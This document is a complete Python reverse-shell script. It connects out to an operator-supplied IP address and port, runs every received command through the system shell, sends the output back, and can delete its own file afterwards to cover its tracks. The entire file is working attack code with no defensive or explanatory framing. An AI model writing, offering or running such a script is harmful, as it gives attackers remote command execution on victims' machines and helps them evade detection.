import socket
import subprocess
import os
import sys

def main():
    home_ip = input("Enter the home IP address: ")
    home_port = int(input("Enter the home port: "))
    cleanup = input("Clean up after myself?: ").lower() == 'y'

    try:
        s = socket.socket()
        s.connect((home_ip, home_port))
    except Exception as e:
        print(f"Connection failed: {e}")
        sys.exit(1)

    while True:
        try:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            
            # Execute the command and get the output
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            if not output:
                output = b"[+] Command executed, but no output.\n" 

        except subprocess.CalledProcessError as e:
            output = e.output
        except Exception as ex:
            output = f"[!] Error: {str(ex)}\n".encode()

        try:
            s.sendall(output)
        except:
            break

    s.close()
    print("[!] Connection closed.")

    if cleanup:
        # Remove the script from the system
        try:
            os.remove(__file__)
        except Exception as e:
            print(f"Failed to remove script: {e}")
    
    os._exit(0)

# wrapping the code in a main method ensures the script is not run on import
if __name__ == "__main__":
    main()